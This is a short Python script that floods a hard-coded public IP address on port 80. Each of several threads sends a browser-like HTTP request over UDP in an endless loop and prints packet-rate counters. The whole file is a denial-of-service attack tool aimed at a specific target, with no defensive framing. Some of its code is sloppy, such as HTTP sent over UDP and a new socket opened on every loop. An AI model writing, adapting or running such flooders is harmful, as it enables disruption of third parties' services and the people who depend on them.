import socket, threading, time

host = "173.8.57.44"
port = 80
process_count = 16

if host.replace('.','').isdigit() == False:
    host = socket.gethostbyname(host)

request = b'GET / HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: keep-'+\
b'alive\r\nsec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A'+\
b'Brand";v="99"\r\nsec-ch-ua-mobile: ?0\r\nDNT: 1\r\nUpgrade-Insecure-'+\
b'Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64'+\
b') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari'+\
b'/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;'+\
b'q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-'+\
b'exchange;v=b3;q=0.9\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate'+\
b'\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nAccept-Encoding'+\
b': gzip, deflate, br\r\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,'+\
b'ru;q=0.7\r\n\r\n'

# main
def connection_thread(tcount):
    print("[+] Started thread " + str(tcount) + "!")
    start_time = time.time()
    packets = 0
    last_count = 0
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, port))
        s.sendall(request)
        packets += 1

        if packets % 100 == 0:
            if time.time()-1 > start_time:
                print(packets, "packents sent, pps="+str(packets-last_count)+" (packets per second)!")
                start_time = time.time()
                last_count = packets

# run multiple threads
process_handler = []
for i in range(1, process_count):
    current = threading.Thread(target=connection_thread, args=[i])
    current.start()
    process_handler.append(current)
